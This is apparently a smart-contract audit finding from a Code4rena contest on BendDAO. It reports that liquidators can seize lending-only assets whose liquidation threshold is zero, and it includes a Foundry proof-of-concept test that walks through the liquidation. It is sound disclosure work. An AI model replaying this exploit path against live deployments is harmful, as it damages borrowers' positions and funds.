# Lines of code

https://github.com/code-423n4/2024-07-benddao/blob/main/src/modules/Configurator.sol#L147-L163


# Vulnerability details


## Description

The protocol has `liquidationThreshold` factor to calculate the health-factor for users, it is a unique value for each pool and asset. Also, The Pool Admin can update them at any time by triggering `Configurator.sol#setAssetCollateralParams()`

However, the current logic uses `liquidationThreshold` value also to check if the asset will not be used as collateral. So The Pool Admin can set `liquidationThreshold` to zero to only let users supply/lend an asset to be used in the borrow system to earn interest for lenders, This will make the asset not accepted as collateral (check the code snap)

```solidity
File: GenericLogic.sol#calculateUserAccountData()

if (currentAssetData.liquidationThreshold != 0) {
/***/
result.totalCollateralInBaseCurrency += vars.userBalanceInBaseCurrency;
/***/
}
```
But, Maliseus liquidators can take those assets (assets only for lending), in order to liquidate user loans.

From [Docs](https://github.com/BendDAO/bend-gitbook-portal-v2/blob/main/concepts/cross-margin-lending.md) in Cross Margin Lending model
```
 The liquidator will repay the debt on behalf of the borrower and take the user's collateral assets at a certain discount price.
```
So, liquidators can break this invariant (take the user's collateral assets), check the coded POC below.

## Impact

-  In case `liquidation threshold == 0` the asset will not be used as collateral, but liquidators still can take it in return for the paid debt (break protocol invariant)
- in normal cases, the `liquidationBonus` will be also zero so the liquidator will have no discount. So, no profit motive for an attacker here, but he damages the user's positions  

## Proof of Concept
Foundry PoC:
- Please copy the following POC in `TestIntCrossLiquidateERC20.t.sol`
```solidity
 function test_Should_LiquidateUSDT_HasDAI_SupplyAsNotCollateral() public {
    //? 1- borrower supply
    //  1.1- tsWETH as collateral
    //  1.2- tsDAI as supply nb: can't used as collateral, bec its `liquidationThreshold == 0`
    //? 2- the borrower call `crossBorrowERC20()` to borrow `tsUSDT`
    // nb: tsUSDT => debt || tsWETH => collateral
    //? 3- drop down eth price to lower heath factor
    //? 4- liquidator call `crossLiquidateERC20()` with `collateralAsset == tsDAI`
    /*----------------------------- */
    tsHEVM.startPrank(tsPoolAdmin);
    tsConfigurator.setAssetCollateralParams(tsCommonPoolId, address(tsDAI), 0, 0, 0);
    tsHEVM.stopPrank();

    prepareUSDT(tsDepositor1);
    //? 1- borrower supply
    //  1.1- tsWETH as collateral
    prepareWETH(tsBorrower1);

    //  1.2- tsDAI as supply nb: can't used as collateral, bec its `liquidationThreshold == 0`
    prepareDAI(tsBorrower1);

    TestUserAccountData memory accountDataBeforeBorrow = getUserAccountData(address(tsBorrower1), tsCommonPoolId);

    // borrow some eth
    uint8[] memory borrowGroups = new uint8[](1);
    borrowGroups[0] = tsLowRateGroupId;

    uint256[] memory borrowAmounts = new uint256[](1);
    uint256 usdtCurPrice = tsPriceOracle.getAssetPrice(address(tsUSDT));
    borrowAmounts[0] = (accountDataBeforeBorrow.availableBorrowInBase * (10 ** tsUSDT.decimals())) / usdtCurPrice;
    //? 2- the borrower call `crossBorrowERC20()` to borrow `tsUSDT`
    // nb: tsUSDT => debt || tsWETH => collateral
    actionCrossBorrowERC20(
      address(tsBorrower1),
      tsCommonPoolId,
      address(tsUSDT),
      borrowGroups,
      borrowAmounts,
      new bytes(0)
    );

    // make some interest
    advanceTimes(1 days);

    //? 3- drop down eth price to lower heath factor
    uint256 wethCurPrice = tsPriceOracle.getAssetPrice(address(tsWETH));
    uint256 wethNewPrice = (wethCurPrice * 80) / 100;
    tsCLAggregatorWETH.updateAnswer(int256(wethNewPrice));

    TestUserAccountData memory accountDataAfterBorrow = getUserAccountData(address(tsBorrower1), tsCommonPoolId);
    assertLt(accountDataAfterBorrow.healthFactor, 1e18, 'ACC:healthFactor');

    //? 4- liquidator call `crossLiquidateERC20()` with `collateralAsset == tsDAI`
    tsLiquidator1.approveERC20(address(tsUSDT), type(uint256).max);
    uint daiBlanceBefore = ERC20(address(tsDAI)).balanceOf(address(tsLiquidator1));

    tsHEVM.prank(address(tsLiquidator1));
    tsCrossLiquidation.crossLiquidateERC20(
      tsCommonPoolId,
      address(tsBorrower1),
      address(tsDAI),
      address(tsUSDT),
      borrowAmounts[0],
      false
    );

    uint daiBlanceAfter = ERC20(address(tsDAI)).balanceOf(address(tsLiquidator1));

    assertGt(daiBlanceAfter, daiBlanceBefore);
  }
```

